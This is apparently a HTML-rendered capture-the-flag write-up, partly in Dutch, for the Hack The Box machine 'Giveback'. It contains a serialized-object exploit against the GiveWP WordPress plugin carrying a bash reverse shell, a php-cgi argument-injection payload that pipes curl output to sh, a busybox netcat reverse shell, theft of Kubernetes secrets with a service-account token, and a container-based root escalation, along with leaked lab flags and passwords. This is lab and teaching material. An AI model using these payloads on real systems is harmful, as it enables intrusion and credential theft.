@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Giveback] └─$ nmap 10.129.50.138 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:07 CET Nmap scan report for 10.129.50.138 Host is up (0.014s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-giveback/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Giveback] └─$ nmap 10.129.50.138 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:07 CET Nmap scan report for 10.129.50.138 Host is up (0.014s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="778">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Giveback] └─$ nmap 10.129.50.138 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:07 CET Nmap scan report for 10.129.50.138 Host is up (0.014s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-giveback/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ nmap 10.129.50.138             
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:07 CET
+Nmap scan report for 10.129.50.138
+Host is up (0.014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE    SERVICE
+22/tcp open     ssh
+80/tcp filtered http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ nmap -p22,80 -sCV 10.129.50.138 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:13 CET
+Nmap scan report for 10.129.50.138
+Host is up (0.014s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
+|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
+80/tcp open  http    nginx 1.28.0
+|_http-generator: WordPress 6.8.1
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-title: GIVING BACK IS WHAT MATTERS MOST &amp;#8211; OBVI
+|_http-server-header: nginx/1.28.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Als je gaat kijken naar de webpagina, kan je zien dat er donatie pagina is. Deze pagina noemt &hellip;.</p>
+<p>Ik ben een exploit gaan zoeken voor de wordpress version en hierop ben ik op de volgende exploit gekomen. URL zetten + emeer uitleg <a href="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932</a></p>
+<pre tabindex="0"><code>──(kali㉿kali)-[~/HTB/Giveback/CVE-2024-5932]
+└─$ python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.127/4444 0&gt;&amp;1&#39;&#34; 
+
+[\] Exploit loading, please wait...
+[+] Requested Data: 
+{&#39;give-form-id&#39;: &#39;17&#39;, &#39;give-form-hash&#39;: &#39;46aa65538c&#39;, &#39;give-price-id&#39;: &#39;0&#39;, &#39;give-amount&#39;: &#39;$10.00&#39;, &#39;give_first&#39;: &#39;Michael&#39;, &#39;give_last&#39;: &#39;Anderson&#39;, &#39;give_email&#39;: &#39;rhall@example.org&#39;, &#39;give_title&#39;: &#39;O:19:&#34;Stripe\\\\\\\\StripeObject&#34;:1:{s:10:&#34;\\0*\\0_values&#34;;a:1:{s:3:&#34;foo&#34;;O:62:&#34;Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData&#34;:1:{s:8:&#34;userInfo&#34;;a:1:{s:7:&#34;address&#34;;O:4:&#34;Give&#34;:1:{s:12:&#34;\\0*\\0container&#34;;O:33:&#34;Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator&#34;:3:{s:12:&#34;\\0*\\0validator&#34;;s:10:&#34;shell_exec&#34;;s:12:&#34;\\0*\\0generator&#34;;O:34:&#34;Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository&#34;:1:{s:11:&#34;\\0*\\0settings&#34;;a:1:{s:8:&#34;address1&#34;;s:52:&#34;bash -c \&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.127/4444 0&gt;&amp;1\&#39;&#34;;}}s:13:&#34;\\0*\\0maxRetries&#34;;i:10;}}}}}}&#39;, &#39;give-gateway&#39;: &#39;offline&#39;, &#39;action&#39;: &#39;give_process_donation&#39;}
+
+┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+
+Connection received on 10.129.50.138 5448
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+&lt;-5d867f47b4-fvvkn:/opt/bitnami/wordpress/wp-admin$
+</code></pre><p>We zullen nu eens gaan kijken naar alle environment variable.. dit kan je gaan doen door gebruik te maken van het printenv commando. Ik zal gaan zoeken op de poort 5000. Dit is meestal de default poort die men gebruikt voor servers en applicaties lokaal te laten draaien.</p>
+<pre tabindex="0"><code>&lt;rdpress-7cc7d98d7f-jvvj8:/tmp$ printenv | grep 5000          
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
+LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
+LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
+LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
+</code></pre><p>Ik zal nu dus in de /tmp folder een file gaan maken waarin we een rce commando zullen zetten. We gaan dan een listener en een http server gaan opzetten zodat we met het volgende commando op onze connectie op de wordpress server de connectie kunnen maken met de php server.</p>
+<pre tabindex="0"><code>Kali machine
+1. Make RCE file
+   ┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ cat /tmp/test 
+busybox nc 10.10.16.68 8001 -e /bin/sh
+
+2. Listener and http server
+   ┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ nc -lvnp 8001                  
+Listening on 0.0.0.0 8001
+
+┌──(kali㉿kali)-[/tmp]
+└─$ python3 -m http.server 
+
+3. On the wordpress server
+php -r &#34;\$c=stream_context_create([&#39;http&#39;=&gt;[&#39;method&#39;=&gt;&#39;POST&#39;,&#39;content&#39;=&gt;&#39;curl 10.10.16.68:8000/test|sh&#39;]]); echo file_get_contents(&#39;http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input&#39;,0,\$c);&#34;
+</code></pre><p>Connection met de php-cgi</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Giveback]
+└─$ nc -lvnp 8001                  
+Listening on 0.0.0.0 8001
+Connection received on 10.129.51.115 30851
+
+lsd
+ls
+php-cgi
+</code></pre><p>using curl cmd read the <a href="https://kubernetes.default.svc/api/v1/namespaces/default/secrets">https://kubernetes.default.svc/api/v1/namespaces/default/secrets</a> kunnen we gaan zien hoe we het masterpassword kunnen vinden. Dit ben ik gaan doen door het volgende commando te gaan gebruiken.</p>
+<pre tabindex="0"><code>curl -k -H &#34;Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)&#34; https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+
+//
+
+    ]
+      },
+      &#34;data&#34;: {
+        &#34;MASTERPASS&#34;: &#34;aU9nTTFqUm5kUlpuVHlIVWlmWGdSVGw1czd1QWV5&#34;
+      },
+      &#34;type&#34;: &#34;Opaque&#34;
+    }
+  ]
+}    
+
+//
+</code></pre><p>you will get masterpassword at last which is on base64</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ echo &#34;aU9nTTFqUm5kUlpuVHlIVWlmWGdSVGw1czd1QWV5&#34; | base64 -d
+iOgM1jRndRZnTyHUifXgRTl5s7uAey                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ ssh babywyrm@giveback.htb                                                               
+babywyrm@giveback.htb&#39;s password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#39;unminimize&#39; command.
+Last login: Mon Nov 3 18:30:39 2025 from 10.10.16.68
+babywyrm@giveback:~$ 
+</code></pre><p>User Flag</p>
+<pre tabindex="0"><code>babywyrm@giveback:~$ cat user.txt 
+f1a1048c95340487710f6d01cc429974
+</code></pre><p>User to root</p>
+<p>Als eerst zullen we beginnen met het</p>
+<pre tabindex="0"><code>babywyrm@giveback:~$ mkdir -p ~/readflag
+babywyrm@giveback:~$ ls
+readflag  user.txt
+babywyrm@giveback:~$ cd readflag/
+babywyrm@giveback:~/readflag$ mkdir rootfs
+</code></pre><pre tabindex="0"><code>babywyrm@giveback:~/readflag$ cat &gt; config.json &lt;&lt; &#39;EOF&#39;
+{
+  &#34;ociVersion&#34;: &#34;1.0.2&#34;,
+  &#34;process&#34;: {
+    &#34;user&#34;: {&#34;uid&#34;: 0, &#34;gid&#34;: 0},
+    &#34;args&#34;: [&#34;/bin/cat&#34;, &#34;/root/root.txt&#34;],
+    &#34;cwd&#34;: &#34;/&#34;,
+    &#34;env&#34;: [&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;],
+    &#34;terminal&#34;: false
+  },
+  &#34;root&#34;: {&#34;path&#34;: &#34;rootfs&#34;},
+  &#34;mounts&#34;: [
+    {&#34;destination&#34;: &#34;/proc&#34;, &#34;type&#34;: &#34;proc&#34;, &#34;source&#34;: &#34;proc&#34;},
+    {&#34;destination&#34;: &#34;/dev&#34;, &#34;type&#34;: &#34;tmpfs&#34;, &#34;source&#34;: &#34;tmpfs&#34;, &#34;options&#34;: [&#34;nosuid&#34;,&#34;strictatime&#34;,&#34;mode=755&#34;,&#34;size=65536k&#34;]},
+    {&#34;destination&#34;: &#34;/bin&#34;, &#34;type&#34;: &#34;bind&#34;, &#34;source&#34;: &#34;/bin&#34;, &#34;options&#34;: [&#34;bind&#34;,&#34;ro&#34;]},
+    {&#34;destination&#34;: &#34;/lib&#34;, &#34;type&#34;: &#34;bind&#34;, &#34;source&#34;: &#34;/lib&#34;, &#34;options&#34;: [&#34;bind&#34;,&#34;ro&#34;]},
+    {&#34;destination&#34;: &#34;/lib64&#34;, &#34;type&#34;: &#34;bind&#34;, &#34;source&#34;: &#34;/lib64&#34;, &#34;options&#34;: [&#34;bind&#34;,&#34;ro&#34;]},
+    {&#34;destination&#34;: &#34;/root&#34;, &#34;type&#34;: &#34;bind&#34;, &#34;source&#34;: &#34;/root&#34;, &#34;options&#34;: [&#34;bind&#34;,&#34;ro&#34;]},
+    {&#34;destination&#34;: &#34;/usr&#34;, &#34;type&#34;: &#34;bind&#34;, &#34;source&#34;: &#34;/usr&#34;, &#34;options&#34;: [&#34;bind&#34;,&#34;ro&#34;]}
+  ],
+  &#34;linux&#34;: {
+    &#34;namespaces&#34;: [
+      {&#34;type&#34;: &#34;pid&#34;},
+      {&#34;type&#34;: &#34;network&#34;},
+      {&#34;type&#34;: &#34;ipc&#34;},
+      {&#34;type&#34;: &#34;uts&#34;},
+      {&#34;type&#34;: &#34;mount&#34;}
+    ]
+  }
+}
+EOF
+</code></pre><p>De admin password zal het password van de maria-db zijn maar je zal hem base64 moeten maken: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T</p>
+<pre tabindex="0"><code>babywyrm@giveback:~/readflag$ sudo /opt/debug run getflag
+Validating sudo...
+Please enter the administrative password: 
+
+Both passwords verified. Executing the command...
+fc174e92b723d301aa0b98292403d924
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
